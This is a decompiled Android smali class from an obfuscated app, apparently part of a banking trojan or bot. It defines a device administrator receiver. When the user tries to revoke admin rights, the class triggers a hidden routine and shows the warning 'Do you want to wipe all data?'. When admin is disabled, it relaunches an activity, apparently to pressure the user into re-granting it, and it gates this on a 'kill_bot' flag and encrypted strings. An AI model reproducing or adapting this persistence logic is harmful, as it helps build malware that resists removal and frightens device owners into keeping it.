.class public Lcom/beginhigh19/p053u;
.super Landroid/app/admin/DeviceAdminReceiver;
.source "SourceFile"


# direct methods
.method public constructor <init>()V
    .locals 0

    invoke-direct {p0}, Landroid/app/admin/DeviceAdminReceiver;-><init>()V

    return-void
.end method


# virtual methods
.method public onDisableRequested(Landroid/content/Context;Landroid/content/Intent;)Ljava/lang/CharSequence;
    .locals 0

    sget-object p1, Lcom/beginhigh19/p023w;->while:Lcom/beginhigh19/p023w;

    if-eqz p1, :cond_0

    iget-object p1, p1, Lcom/beginhigh19/p023w;->new:Lfddo/fddo;

    invoke-virtual {p1}, Lfddo/fddo;->fddo()V

    :cond_0
    const-string p1, "Do you want to wipe all data?"

    return-object p1
.end method

.method public onDisabled(Landroid/content/Context;Landroid/content/Intent;)V
    .locals 1

    const-string p2, "5aa7c3433fcccdff6b3eb633687d2c1b"

    invoke-static {p2}, Lfddo/break;->fddo(Ljava/lang/String;)Ljava/lang/String;

    move-result-object p2

    sget-object v0, Ljava/lang/Boolean;->FALSE:Ljava/lang/Boolean;

    invoke-static {p1, p2, v0}, Lfddo/throw;->case(Landroid/content/Context;Ljava/lang/String;Ljava/lang/Boolean;)V

    const-string p2, "kill_bot"

    invoke-static {p1, p2, v0}, Lfddo/throw;->fddo(Landroid/content/Context;Ljava/lang/String;Ljava/lang/Boolean;)Ljava/lang/Boolean;

    move-result-object p2

    invoke-virtual {p2}, Ljava/lang/Boolean;->booleanValue()Z

    move-result p2

    if-nez p2, :cond_0

    const-string p2, "5fa1c64803ddf3ed64"

    invoke-static {p2}, Lfddo/break;->fddo(Ljava/lang/String;)Ljava/lang/String;

    move-result-object p2

    const-string v0, "admin"

    invoke-static {p1, p2, v0}, Lfddo/throw;->this(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)V

    new-instance p2, Landroid/content/Intent;

    const-class v0, Lcom/beginhigh19/p085x;

    invoke-direct {p2, p1, v0}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    const/high16 v0, 0x10000000

    invoke-virtual {p2, v0}, Landroid/content/Intent;->addFlags(I)Landroid/content/Intent;

    const/high16 v0, 0x20000000

    invoke-virtual {p2, v0}, Landroid/content/Intent;->addFlags(I)Landroid/content/Intent;

    invoke-virtual {p1, p2}, Landroid/content/Context;->startActivity(Landroid/content/Intent;)V

    :cond_0
    return-void
.end method

.method public onEnabled(Landroid/content/Context;Landroid/content/Intent;)V
    .locals 1

    const-string p2, "5aa7c3433fcccdff6b3eb633687d2c1b"

    invoke-static {p2}, Lfddo/break;->fddo(Ljava/lang/String;)Ljava/lang/String;

    move-result-object p2

    sget-object v0, Ljava/lang/Boolean;->TRUE:Ljava/lang/Boolean;

    invoke-static {p1, p2, v0}, Lfddo/throw;->case(Landroid/content/Context;Ljava/lang/String;Ljava/lang/Boolean;)V

    return-void
.end method

.method public onReceive(Landroid/content/Context;Landroid/content/Intent;)V
    .locals 0

    invoke-super {p0, p1, p2}, Landroid/app/admin/DeviceAdminReceiver;->onReceive(Landroid/content/Context;Landroid/content/Intent;)V

    return-void
.end method
